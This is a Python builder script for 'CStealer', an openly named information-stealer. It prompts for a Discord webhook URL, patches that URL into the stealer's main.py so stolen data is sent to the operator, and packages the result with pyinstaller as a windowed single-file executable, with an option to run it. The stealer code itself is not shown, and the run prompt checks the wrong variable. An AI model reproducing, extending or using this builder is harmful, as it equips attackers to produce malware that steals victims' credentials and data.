from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time
import fade
import ctypes

username = os.getlogin()

ctypes.windll.kernel32.SetConsoleTitleW(f" CStealer Builder - {username}")
os.system("cls")

text = """
 ▄████▄    ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓    ▓█████  ██▀███  
▒██▀ ▀█  ▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░    ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒ ▓███▀ ░▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒   ░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░        ░  ░  ░    ░         ░    ░   ▒     ░ ░      ░     ░░   ░ 
  ░            ░              ░  ░     ░  ░    ░  ░   ░  ░   ░     
                
                https://github.com/cankatx/cstealer                                        
"""

faded_text = fade.greenblue(text)
print(faded_text)

time.sleep(1)

def endHandler():
  os._exit(0)

def checkhook(webhook):
    if not "api/webhooks" in webhook:
        print(f"\n{Fore.RED}Invalid webhook{Fore.RESET}")
        time.sleep(1)
        endHandler()

webhook = input(Fore.CYAN + "\nEnter your webhook URL: " + Style.RESET_ALL)
checkhook(webhook)
filename = "main.py"
filepath = os.path.join(os.getcwd(), filename)
with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()
new_content = content.replace('"YOUR_WEBHOOK_URL"', f'"{webhook}"')
with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)
        time.sleep(1)
        answer = input(Fore.CYAN + "\nDo you want to build exe file? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
                    os.system (f"pyinstaller --noconfirm --onefile --windowed {filename}")
                    print(f"\n{Fore.CYAN}File successfully builded{Fore.RESET}")
                    time.sleep(1)
        elif answer.upper() == "N":
              time.sleep(1)

        run = input(Fore.CYAN + "\nDo you want to test the build? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
                    os.system (f"{filename}")
                    time.sleep(1)
        elif answer.upper() == "N":
              print(f"\n{Fore.RED}Build done successfully{Fore.RESET}")
              time.sleep(1)
              endHandler()
